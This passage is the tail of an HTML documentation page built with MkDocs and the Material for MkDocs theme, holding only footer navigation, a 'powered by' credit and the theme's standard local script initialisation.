              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
    
  </body>
</html>